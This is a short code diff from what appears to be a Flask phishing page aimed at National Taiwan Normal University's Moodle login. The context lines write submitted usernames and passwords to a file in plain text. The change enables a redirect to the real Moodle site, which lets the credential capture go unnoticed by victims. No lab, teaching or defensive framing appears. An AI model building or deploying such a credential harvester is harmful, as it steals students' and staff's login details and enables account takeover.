@@ -14,7 +14,7 @@ def index():
             f.write(f"Username: {username}, Password: {password}\n")
         
         # 重定向到 Moodle 網站
-        # return redirect("https://moodle3.ntnu.edu.tw/login/index.php")
+        return redirect("https://moodle3.ntnu.edu.tw/login/index.php")
 
     # 返回 index.html
     return send_from_directory('.', 'index.html')
